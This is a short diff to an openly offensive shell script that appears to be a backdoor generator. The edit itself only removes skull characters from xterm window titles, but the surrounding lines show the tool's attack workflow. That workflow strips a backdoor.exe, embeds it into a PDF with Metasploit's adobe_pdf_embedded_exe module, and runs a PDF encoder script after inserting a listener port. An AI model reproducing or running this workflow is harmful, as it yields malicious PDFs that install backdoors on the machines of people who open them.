@@ -20,6 +20,7 @@ resize -s 40 89 > /dev/null
 
 
 
+
 # ---------------------
 # check if user is root
 # ---------------------
@@ -2910,7 +2911,7 @@ strip --strip-debug $IPATH/output/backdoor.exe
 
 # if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
 # using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
-xterm -T "☠ EVIL PDF BUILDER ☠" -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1
+xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1
 
 
 # move files from metasploit to local directory
@@ -3042,7 +3043,7 @@ sed -i "s|lP0Rt|$lport|" PDF_encoder.py
 
 
 # runing evil-pdf-builder python script
-xterm -T "☠ EVIL PDF BUILDER ☠" -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
+xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
 # moving files
 mv PDF_encoder[bak].py PDF_encoder.py
 mv ~/backdoor.exe $IPATH/output/backdoor.exe
